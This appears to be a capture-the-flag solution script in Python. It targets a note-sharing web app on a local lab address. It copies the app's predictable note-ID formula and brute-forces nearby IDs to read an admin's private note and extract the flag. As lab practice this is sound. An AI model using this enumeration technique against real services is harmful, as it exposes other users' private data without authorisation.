import requests
import re
from hashlib import sha256

def generateId(title, body, count_id):
    return f"{sha256(body.encode()[:4]).hexdigest()[:8]}{hex(count_id)[2:]}{hex((sum(map(ord,title)))^0x1337)[2:]}"

base = 'http://172.17.0.3:3000'

real_note_id = requests.post(base, data={'title': 'a', 'body': 'a'}).url.split('/')[-1]
id_base = int(real_note_id[8:8+6*2], 16)

for i in range(-256, 256):
    note_id = generateId('Admin Note', 'SSM{', id_base + i*0x20)
    r = requests.get(f'{base}/{note_id}')
    if r.status_code == 200:
        print(re.findall('(SSM{.*})', r.text)[0])
        break